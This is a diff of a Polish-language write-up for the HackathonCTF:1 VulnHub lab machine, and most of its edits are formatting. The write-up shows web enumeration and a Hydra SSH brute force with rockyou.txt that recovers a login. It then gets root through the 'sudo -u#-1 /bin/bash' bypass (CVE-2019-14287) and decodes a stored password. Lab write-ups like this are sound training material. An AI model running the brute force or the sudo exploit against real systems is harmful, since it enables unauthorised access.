@@ -29,6 +29,7 @@ Write-up is in Polish language.
 # Wstęp
 **HackathonCTF:1** został stworzony, jak i dużo innych ciekawych obrazów, przez [Somu Sen](https://www.vulnhub.com/author/somu-sen,747/). W tej wirtualce Twoim zadaniem jest zdobycie **root**a (flag nie widziałem). Ten obraz jest naprawdę prosty i będziesz miał dużo frajdy, jeżeli sam to wszystko przejdziesz. Wirtualka jest na **Ubuntu 14.04**, więc ja na swoim **XPC-NG** nawet nie musiałem nic grzebać, żeby sieciówka się dobrze uruchomiła.
 {: .text-justify}
+
 ## Moduły w Metasploicie
 Zaczniemy od Metasploita. Przy okazji pokażę, jak się używa z niego modułów. Na tapetę, do celów szkoleniowych weźmiemy moduł [Wmap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/). Jest to skaner stron **WWW**. Niestety jest dość stary, ale to nie przeszkadza do pobieżnej analizy. Poniżej jest screen z komend, które wydałem:
 {: .text-justify}
@@ -281,7 +282,7 @@ msf6 >
 ```
 Niestety, poza zakodowanym ciągiem w **Base64** (**c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**), nic ciekawego ten moduł nie znalazł. Działamy więc ręcznie. Po przeskanowaniu **Nmap**em, widzimy następujące otwarte porty.
 {: .text-justify}
-Należy pamiętać o przełączniku __-p-__, ponieważ **SSH** jest na nietypowym porcie i szybkie skanowanie nam go nie znajdzie. Polecenie z **Nmap**a zostawiam czytelnikowi.
+Należy pamiętać o przełączniku _-p-_, ponieważ **SSH** jest na nietypowym porcie i szybkie skanowanie nam go nie znajdzie. Polecenie z **Nmap**a zostawiam czytelnikowi.
 {: .text-justify}
 {: .notice--danger}
 ```bash
@@ -298,7 +299,7 @@ Tradycyjnie zacznijmy od analizy **HTTP**. Wchodzimy na stronę (u mnie 172.16.1
 ```bash
 # dirb http://172.16.1.167/
 ```
-Z ciekawszych jest rzeczy jest plik **http://172.16.1.167/robots.txt**. Poniżej zawartość:
+Z ciekawszych jest rzeczy jest plik _http://172.16.1.167/robots.txt_. Poniżej zawartość:
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 http://172.16.1.167/robots.txt
@@ -330,12 +331,12 @@ c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==
 </p>
 </pre>
 </div>
-**Dirb** nic więcej nie znalazł, jednak w **robots.txt** jest pewna wskazówka dotycząca plików, katalogów (**ctf, ftc, sudo**). Próba wejścia na **http://172.16.1.167/sudo** kończy się fiaskiem. Podobnie jest z **ctf** i **ftc**. Poszerzmy skanowanie pod kątem plików z rozszerzeniami: **txt,php,html,htm**:
+**Dirb** nic więcej nie znalazł, jednak w **robots.txt** jest pewna wskazówka dotycząca plików, katalogów (**ctf, ftc, sudo**). Próba wejścia na _http://172.16.1.167/sudo_ kończy się fiaskiem. Podobnie jest z **ctf** i **ftc**. Poszerzmy skanowanie pod kątem plików z rozszerzeniami: **txt,php,html,htm**:
 {: .text-justify}
 ```bash
 # gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.167 -x php,txt,html,htm
 ```
-Bingo, są strony: **http://172.16.1.167/sudo.html** i **http://172.16.1.167/ftc.html**. Ich zawartość jest poniżej:
+Bingo, są strony: _http://172.16.1.167/sudo.html_ i _http://172.16.1.167/ftc.html_. Ich zawartość jest poniżej:
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 sudo.html
@@ -385,19 +386,20 @@ echo $string -n | xxd -r -p
 ```console
 se rockyou.txt
 ```
-Został nam do rozkodowania ciąg **c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**, który jest w **robots.txt**. Tam zaś jest zakodowany ciąg w **Base64**.
+Został nam do rozkodowania ciąg **c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**, który jest w _robots.txt_. Tam zaś jest zakodowany ciąg w **Base64**.
 {: .text-justify}
 ```bash
 # echo -n c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg== | base64 -d
 ssh-bruteforce-sudoit
 ```
-Żeby się dostać na serwer **SSH**, posłużymy się metodą siłową, używając słownika rockyou.txt. Do tego bardzo dobrze nadaje się **Hydra**. Przyznam, że na początku zmyliło mnie te początkowe **se** w **se rockyou.txt**. Stworzyłem plik ze słowami zaczynającymi się od **se**, jednak nic to nie dało. Więc zacząłem skanowanie całego pliku **rockyou.txt**. Na szczęście nie trwało to długo, zwłaszcza, że w parametrach **Hydry** ustawiłem więcej wątków niż jest przewidziane standardowo. Skanowanie **SSH** skończyło się dosyć szybko.
+Żeby się dostać na serwer **SSH**, posłużymy się metodą siłową, używając słownika rockyou.txt. Do tego bardzo dobrze nadaje się **Hydra**. Przyznam, że na początku zmyliło mnie te początkowe **se** w **se rockyou.txt**. Stworzyłem plik ze słowami zaczynającymi się od **se**, jednak nic to nie dało. Więc zacząłem skanowanie całego pliku _rockyou.txt_. Na szczęście nie trwało to długo, zwłaszcza, że w parametrach **Hydry** ustawiłem więcej wątków niż jest przewidziane standardowo. Skanowanie **SSH** skończyło się dosyć szybko.
 {: .text-justify}
 ```bash
 # hydra -t 64 -l test -P /usr/share/wordlists/rockyou.txt ssh://172.16.1.167:7223 -V -I -f
 [7223][ssh] host: 172.16.1.167   login: test   password: jordan23
 # ssh test@172.16.1.167 -p 7223
 ```
+
 ## Mamy Shella
 Mam taki nawyk, że wchodząc na serwer od razu przeglądam historię. Tym razem się to przydało. Mamy parę ciekawych rzeczy:
 {: .text-justify}
@@ -407,7 +409,7 @@ Mam taki nawyk, że wchodząc na serwer od razu przeglądam historię. Tym razem
 100  nano pass.txt
 167  sudo -u#-1 /bin/bash
 ```
-Widzimy jakiś plik i komendę z **Sudo**:
+Widzimy jakiś plik i komendę z programu **Sudo**:
 {: .text-justify}
 ```bash
 # test@ctf:~$ sudo -l
@@ -418,14 +420,14 @@ Matching Defaults entries for test on ctf:
 User test may run the following commands on ctf:
     (ALL, !root) ALL
 ```
-**(ALL, !root) ALL** - to jest ciekawe
+**(ALL, !root) ALL** - to jest ciekawe.
 {: .notice--warning}
 
 ## Podatność CVE 2019-14287
 ```bash
 # sudo -u#-1 /bin/bash
 ```
-Ta komenda daje dostęp do **root**a. Poszukałem trochę po necie i się dowiedziałem, że jest to podatność z **CVE 2019-14287**. Możesz o niej przeczytać [tutaj](https://www.exploit-db.com/exploits/47502). Przeglądając historię z konsoli, jeszcze widzimy plik **pass.txt**. Mając **root**a szybko coś znajdziemy:
+Ta komenda daje dostęp do **root**a. Poszukałem trochę po necie i się dowiedziałem, że jest to podatność z **CVE 2019-14287**. Możesz o niej przeczytać [tutaj](https://www.exploit-db.com/exploits/47502). Przeglądając historię z konsoli, jeszcze widzimy plik _pass.txt_. Mając **root**a szybko coś znajdziemy:
 {: .text-justify}
 ```bash
 # root@ctf:~# find / -name pass.txt
@@ -437,7 +439,7 @@ Dekodujemy:
 # test@ctf:~$ echo Q1RGZGZyR0hZalVzU3NLS0AxMjM0NQo= | base64 -d
 CTFdfrGHYjUsSsKK@12345
 ```
-Jest hasło, ale nie wiadomo do czego. :smiley: Potem się okazało, że się przydało do pliku __/var/zip.rar__. W pliku nic nie było.
+Jest hasło, ale nie wiadomo do czego. :smiley: Potem się okazało, że się przydało do pliku _/var/zip.rar_. W pliku nic nie było.
 {: .text-justify}
 Podsumowując: Bardzo ciekawy i dosyć łatwy obraz do złamania. W sam raz dla początkujących.
 {: .notice--success}
